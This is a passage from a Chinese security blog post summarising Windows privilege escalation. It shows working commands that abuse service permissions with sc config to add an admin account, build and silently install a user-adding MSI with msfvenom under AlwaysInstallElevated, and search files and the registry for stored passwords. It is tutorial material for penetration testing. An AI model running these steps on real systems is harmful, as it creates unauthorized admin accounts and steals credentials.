+<p>sc config PFNET binpath= “net user rottenadmin P@ssword123! /add” </p>
+<p>sc stop PFNET </p>
+<p>sc start PFNET </p>
+</blockquote>
+<p>每当我们开启服务时sc命令都返回了一个错误。这是因为net user命令没有指向二进制服务，因此SCM无法 与服务进行通信，通过使用执行自动迁移到新进程的payload，手动迁移进程，或者在执行后将服务的bin路径设置回原始服务二进制文件，可以解决这个问题。</p>
+<p>或者我们在权限允许的情况下，将我们的木马放到服务目录下，并重命名为服务启动的应用名称。</p>
+<p>电脑重启时即可获得一个system的shell</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g36w98c9idj30ko05a0tx.jpg" alt=""></p>
+<p>msf也集成了该类模块</p>
+<p>exploit/windows/local/service_permissions</p>
+<p>同样不好用。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g36vqleof9j30p60audk5.jpg" alt=""></p>
+<h3 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h3><p>AlwaysInstallElevated是一种允许非管理用户以SYSTEM权限运行Microsoft Windows安装程序包（.MSI文件）的设置。默认情况下禁用此设置，需系统管理员手动启用他。<br>可以通过查询以下注册表项来识别此设置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:00000001</span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:00000001</span><br></pre></td></tr></table></figure>
+<p>使用reg query命令查询是否存在漏洞</p>
+<blockquote>
+<p>C:> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</p>
+</blockquote>
+<p>or</p>
+<blockquote>
+<p>C:> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</p>
+</blockquote>
+<p>如果存在漏洞，上面将输出以下内容</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g36wlxx0a9j31040f4gmx.jpg" alt=""></p>
+<p>如果系统没这个漏洞，它将输出错误</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\hp\Desktop&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">ERROR: The system was unable to find the specified registry key or value.</span><br></pre></td></tr></table></figure>
+<p>然后我们使用msfvenom生成msi文件，进行提权</p>
+<blockquote>
+<p> msfvenom -p windows/adduser USER=test000 PASSWORD=password123! -f msi -o rotten.msi</p>
+</blockquote>
+<p>然后使用</p>
+<blockquote>
+<p> msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi </p>
+</blockquote>
+<p>即可</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g36x58bqpyj30yb0bkq3b.jpg" alt=""></p>
+<p>msf下的模块为：</p>
+<blockquote>
+<p>exploit/windows/local/always_install_elevated </p>
+</blockquote>
+<h3 id="Unattended-Installs"><a href="#Unattended-Installs" class="headerlink" title="Unattended Installs"></a>Unattended Installs</h3><p>自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。 这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。</p>
+<p>全盘搜索Unattend文件是个好办法，它通常会在以下一个文件夹中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Panther\ </span><br><span class="line">C:\Windows\Panther\Unattend\ </span><br><span class="line">C:\Windows\System32\ </span><br><span class="line">C:\Windows\System32\sysprep\</span><br></pre></td></tr></table></figure>
+<p>除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件，这些文件中都会包含部署操作 系统时使用的凭据信息，这些信息可以帮助我们提权。</p>
+<blockquote>
+<p>C:\Users\user\Desktop&gt; dir C:*vnc.ini /s /b /c</p>
+</blockquote>
+<p>或者在名称中包含关键词的项目：</p>
+<blockquote>
+<p>C:\Users\user\Desktop&gt; dir C:\ /s /b /c | findstr /sr *password*</p>
+</blockquote>
+<p>或者可以在文件内容中搜索password之类的关键字：</p>
+<blockquote>
+<p>C:\Users\user\Desktop&gt;findstr /si password *.txt | *.xml | *.ini</p>
+</blockquote>
+<p>可以查询注册表，例如，字符串password：</p>
+<blockquote>
+<p>reg query HKLM /f password /t REG_SZ /s<br>reg query HKCU /f password /t REG_SZ /s</p>
+</blockquote>
+<p>在这些文件中通常包含用户名和密码，密码使用base64编码，并且在最后会附加”Password”，所以真正的密 码需要去掉最后的”Password”。 </p>
+<p>msf模块（post/windows/gather/enum_unattend ）</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g36xi2do4qj30mr08rgnt.jpg" alt=""></p>
+<h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>唔，今天是5.20了，文章也断断续续写了一周，里面内容或许比较基础，还有许多像注册表、组策略之类的提权方式没有提出，但是，我只想说：祝天下所有的情侣都是失散多年的兄妹….</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/windows提权总结/">windows提权总结</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2019年05月13日 - 21:05</p>
+  <p><span>最后更新:</span>2019年05月20日 - 19:05</p>
+  <p><span>原始链接:</span><a href="/windows提权总结/" title="windows提权总结">https://lengjibo.github.io/windows提权总结/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/windows提权总结/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/提权/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/条件竞争上传/" rel="next" title="条件竞争上传">
+                <i class="fa fa-chevron-left"></i> 条件竞争上传
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.screenshot.net/9zoe9ax"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">55</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">14</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">80</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zfsec.cn/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://nsroms.com/" title="philipzou" target="_blank">philipzou</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#提权前奏"><span class="nav-number">1.</span> <span class="nav-text">提权前奏</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#windows-2k3、xp"><span class="nav-number">2.</span> <span class="nav-text">windows 2k3、xp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#at命令提权"><span class="nav-number">2.1.</span> <span class="nav-text">at命令提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#at-配合-msf提权"><span class="nav-number">2.1.1.</span> <span class="nav-text">at 配合 msf提权</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#windows-7、8、08、12、16"><span class="nav-number">3.</span> <span class="nav-text">windows 7、8、08、12、16</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sc命令提权（administrator–-gt-system）"><span class="nav-number">3.1.</span> <span class="nav-text">sc命令提权（administrator–&gt;system）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#不带引号的服务路径"><span class="nav-number">3.2.</span> <span class="nav-text">不带引号的服务路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#不安全的服务权限"><span class="nav-number">3.3.</span> <span class="nav-text">不安全的服务权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AlwaysInstallElevated"><span class="nav-number">3.4.</span> <span class="nav-text">AlwaysInstallElevated</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Unattended-Installs"><span class="nav-number">3.5.</span> <span class="nav-text">Unattended Installs</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#写在后面"><span class="nav-number">4.</span> <span class="nav-text">写在后面</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
